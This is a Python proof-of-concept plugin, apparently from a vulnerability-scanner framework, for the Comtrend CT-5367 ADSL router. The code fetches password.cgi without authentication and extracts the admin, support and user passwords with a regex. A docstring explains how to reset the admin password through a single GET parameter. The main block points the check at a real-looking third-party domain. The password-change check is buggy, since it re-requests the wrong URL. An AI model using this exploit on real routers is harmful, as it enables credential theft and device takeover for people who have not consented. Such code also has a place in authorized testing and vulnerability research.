#!/usr/bin/env python
# coding: UTF-8

'''
author: yichin
name: Comtrend ADSL Router CT-5367 C01_R12 - Remote Root
refer: https://www.exploit-db.com/exploits/16275/
refer: http://www.exploit-db.com/exploits/18101/
description:
    访问 http://foobar/password.cgi 管理员密码包含在返回结果中
    访问 http://foobar/password.cgi?sysPassword=rootpass&sptPassword=supportpass重置管理员密码
'''

import re
import urlparse
from ..miniCurl import Curl
from ..t  import T



class P(T):
    def __init__(self):
        T.__init__(self)
    def verify(self,head='',context='',ip='',port='',productname={},keywords='',hackinfo=''):
        arg='http://'+ip+':'+port+'/'
        curl=Curl()
        result = {}
        result['result']=False

        payload = arg + 'password.cgi'
        code, head, res, err, _ = curl.curl2(payload)
        if code == 200:
            m = re.search(r"pwdAdmin = '[\S]*';\s*pwdSupport = '[\S]*';\s*pwdUser = '[\S]*';", res)
            if m:
                output('find administrator password on telnet: ' + m.group(0),result,'hole')
    
        payload_change_pass = 'password.cgi?sysPassword=testvul'
        code, head, res, err, _  = curl.curl2(payload)
        if code == 200 and "pwdAdmin = 'testvul'" in res:
            output('password change vulnerable: '+ arg + 'password.cgi?sysPassword=rootpass&sptPassword=supportpass',result,'hole')
    

        del curl
        return result


def output(url,result,label):
    info = url + '  Comtrend  Vul '
    result['result']=True
    result['VerifyInfo'] = {}
    result['VerifyInfo']['type']='infodisclosure Vul'
    result['VerifyInfo']['URL'] =url
    result['VerifyInfo']['payload']='/root/github/poccreate/thirdparty/www/www_368d22b2d9782bbbe35d3416a18a2db1.py'
    result['VerifyInfo']['level']=label
    result['VerifyInfo']['result'] =info

if __name__ == '__main__':
    print P().verify(ip='http://yunlai.cn:803/sfdsfds/',port='80')

#/root/github/poccreate/thirdparty/www/www_368d22b2d9782bbbe35d3416a18a2db1.py
#/root/github/poccreate/codesrc/exp-1861.py